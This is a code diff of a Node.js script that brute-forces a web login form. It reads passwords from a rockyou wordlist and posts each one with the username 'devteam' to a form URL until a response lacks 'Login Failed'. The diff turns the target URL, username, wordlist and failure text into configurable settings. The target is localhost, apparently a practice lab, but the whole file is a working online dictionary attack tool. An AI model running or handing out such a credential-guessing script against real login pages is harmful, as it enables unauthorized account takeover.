@@ -2,11 +2,20 @@ const fs = require('fs')
 const axios = require ('axios')
 const qs = require('qs')
 
-findValidPassword()
 
-async function findValidPassword(){
-    for(const password of readPossiblePasswords()){
-        const passwordValidity = await checkPasswordValidaty(password)
+const configuration = {
+    htmlFormUrl : "http://localhost:3000",
+    passwordFile : "rockyou-20.txt",
+    username : "devteam",
+    failedPasswordText : "Login Failed"
+}
+
+findValidPassword(configuration)
+
+async function findValidPassword(configuration){
+    const {passwordFile} = configuration
+    for(const password of readPossiblePasswords(passwordFile)){
+        const passwordValidity = await checkPasswordValidaty(configuration, password)
         console.log(`checking password: ${password}`)
         if(passwordValidity.isValidPassword){
             console.log("found valid password")
@@ -17,25 +26,26 @@ async function findValidPassword(){
 }
 
 
-function readPossiblePasswords() {
-    const data = fs.readFileSync("rockyou-20.txt", 'utf-8')
+function readPossiblePasswords(passwordFile) {
+    const data = fs.readFileSync(passwordFile, 'utf-8')
     const lines = data.split(/\r?\n/)
     return lines
 };
 
 
-async function checkPasswordValidaty(password){
-    const data = { username: "devteam", password : password}
+async function checkPasswordValidaty(configuration, password){
+    const {username, htmlFormUrl, failedPasswordText} = configuration
+    const data = { username: username, password : password}
     
     const options = {
         headers: { 'content-type': 'application/x-www-form-urlencoded' }
       }
     const response = await axios.post(
-        "http://localhost:3000", qs.stringify(data),
+        htmlFormUrl, qs.stringify(data),
         options)
     
     
-    const isValidPassword = !response.data.includes('Login Failed')
+    const isValidPassword = !response.data.includes(failedPasswordText)
     return {password: password, isValidPassword}
     
 }
